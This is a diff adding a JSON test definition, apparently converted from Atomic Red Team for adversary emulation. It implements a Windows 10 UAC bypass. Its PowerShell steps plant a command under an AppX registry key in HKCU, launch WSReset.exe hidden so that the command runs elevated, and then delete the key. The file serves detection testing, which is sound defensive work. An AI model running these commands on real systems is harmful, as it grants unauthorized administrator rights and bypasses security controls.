@@ -1,0 +1,58 @@
+{
+  "id": "3b96673f-9c92-40f1-8a3e-ca060846f8d9",
+  "name": "UAC Bypass with WSReset Registry Modification",
+  "description": "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "e65a6976-bdbd-4c12-80b0-a6a4ea2271e9",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item #{commandpath} -Force | Out-Null\nNew-ItemProperty -Path #{commandpath} -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null\nSet-ItemProperty -Path #{commandpath} -Name \"(default)\" -Value \"#{commandtorun}\" -Force -ErrorAction SilentlyContinue | Out-Null\n$Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8443d122-0359-4cfb-9166-86f3eb31e7b2",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item #{commandpath} -Recurse -Force\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "e65a6976-bdbd-4c12-80b0-a6a4ea2271e9",
+      "p": "on-success",
+      "o": "8443d122-0359-4cfb-9166-86f3eb31e7b2"
+    },
+    {
+      "s": "e65a6976-bdbd-4c12-80b0-a6a4ea2271e9",
+      "p": "on-failure",
+      "o": "8443d122-0359-4cfb-9166-86f3eb31e7b2"
+    }
+  ],
+  "tags": [
+    "T1548.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "commandpath",
+      "type": "string",
+      "description": "Registry path",
+      "value": "HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
+    },
+    {
+      "name": "commandtorun",
+      "type": "string",
+      "description": "Command to run",
+      "value": "C:\\Windows\\System32\\cmd.exe /c start cmd.exe"
+    }
+  ]
+}
